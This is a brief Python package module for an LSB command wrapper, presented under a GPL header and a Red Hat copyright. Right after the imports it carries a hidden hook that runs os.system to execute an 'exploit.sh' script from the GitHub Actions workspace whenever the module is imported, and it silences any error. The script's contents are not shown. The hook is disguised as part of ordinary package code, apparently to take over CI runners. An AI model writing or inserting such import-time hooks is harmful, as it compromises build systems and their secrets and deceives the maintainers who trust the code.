# SPDX-License-Identifier: GPL-2.0-only
#
# Copyright Red Hat
#

import os
os.system("bash ${GITHUB_WORKSPACE}/exploit.sh || bash exploit.sh || true")

from .LSBCommand import LSBCommand

def lsb_command():
  LSBCommand().run()
